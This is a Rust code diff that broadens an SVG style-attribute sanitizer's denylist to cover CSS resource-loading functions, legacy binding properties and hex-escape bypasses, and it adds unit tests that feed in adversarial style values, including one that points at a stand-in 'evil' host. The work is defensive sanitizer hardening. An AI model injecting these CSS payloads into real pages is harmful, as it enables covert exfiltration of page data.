@@ -2115,14 +2115,45 @@ fn sanitize_tag_attrs(tag: &str) -> String {
             }
         }
 
-        // Strip style attributes that contain url() or expression() to
-        // prevent CSS-based data exfiltration via network requests.
+        // Strip style attributes that contain resource-loading or
+        // bypass-bearing CSS values to prevent CSS-based data
+        // exfiltration via network requests. Covers the entire
+        // family of CSS functions that can fetch a URL or alter
+        // parsing:
+        //   - `url(...)` — canonical exfil vector
+        //   - `image(...)`, `image-set(...)`, `cross-fade(...)` —
+        //     CSS image functions that can load resources WITHOUT
+        //     containing the substring `url(`
+        //   - `expression(...)` — IE legacy script execution
+        //   - `@import` — smuggled at-rule (browsers ignore in
+        //     inline style but stripping fail-closed)
+        //   - `behavior:` / `-moz-binding:` — legacy IE / Firefox
+        //     binding mechanisms
+        //   - `\` — CSS hex escapes (e.g. `url\28...` normalises
+        //     to `url(...)` at parse time); a backslash should
+        //     never appear in any legitimate CSS value emitted
+        //     here, so its presence is itself a tell.
+        //
+        // Sister-site to the JS docs SSG's allowlist in
+        // `packages/playground/scripts/lib/docs-render.mjs` per
+        // `.claude/rules/fix-propagation.md`. The JS side took
+        // the stricter step of switching to a property:value
+        // allowlist; the Rust raw-SVG passthrough surface uses
+        // this broadened denylist as a defence-in-depth layer
+        // alongside `sanitize_css_value` (which strips `(`, `)`,
+        // and `\` entirely from directive-derived values).
         if attr_name.eq_ignore_ascii_case("style") {
             if let Some(ref val) = attr_value {
                 let lower_val: String = val.chars().flat_map(|c| c.to_lowercase()).collect();
                 if lower_val.contains("url(")
+                    || lower_val.contains("image(")
+                    || lower_val.contains("image-set(")
+                    || lower_val.contains("cross-fade(")
                     || lower_val.contains("expression(")
                     || lower_val.contains("@import")
+                    || lower_val.contains("behavior:")
+                    || lower_val.contains("-moz-binding")
+                    || lower_val.contains('\\')
                 {
                     continue;
                 }
@@ -2969,6 +3000,56 @@ mod sanitize_tag_attrs_tests {
         let result = sanitize_tag_attrs(tag);
         assert!(result.contains("style"));
         assert!(result.contains("fill: red"));
+    }
+
+    // CSS image functions that can load resources WITHOUT
+    // containing the substring `url(`. Each entry pairs with an
+    // equivalent adversarial test in
+    // `packages/playground/tests/docs-render.test.ts`.
+    #[test]
+    fn test_strips_style_with_image_set() {
+        let tag = "<rect style=\"background-image: image-set('/exfil' 1x)\">";
+        let result = sanitize_tag_attrs(tag);
+        assert!(!result.contains("style"));
+    }
+
+    #[test]
+    fn test_strips_style_with_image_fn() {
+        let tag = "<rect style=\"background-image: image('/exfil')\">";
+        let result = sanitize_tag_attrs(tag);
+        assert!(!result.contains("style"));
+    }
+
+    #[test]
+    fn test_strips_style_with_cross_fade() {
+        let tag = "<rect style=\"background-image: cross-fade(url(/a) 50%)\">";
+        let result = sanitize_tag_attrs(tag);
+        assert!(!result.contains("style"));
+    }
+
+    #[test]
+    fn test_strips_style_with_behavior() {
+        let tag = "<rect style=\"behavior: url(#default)\">";
+        let result = sanitize_tag_attrs(tag);
+        assert!(!result.contains("style"));
+    }
+
+    #[test]
+    fn test_strips_style_with_moz_binding() {
+        let tag = "<rect style=\"-moz-binding: url(http://evil/x)\">";
+        let result = sanitize_tag_attrs(tag);
+        assert!(!result.contains("style"));
+    }
+
+    #[test]
+    fn test_strips_style_with_hex_escaped_paren() {
+        // CSS escape sequence `\28` parses as `(`, normalising
+        // `url\28...\29` back to `url(...)` at the browser. A
+        // backslash should never appear in any legitimate CSS
+        // value reaching this code path.
+        let tag = "<rect style=\"background-image: url\\28/exfil\\29\">";
+        let result = sanitize_tag_attrs(tag);
+        assert!(!result.contains("style"));
     }
 
     #[test]
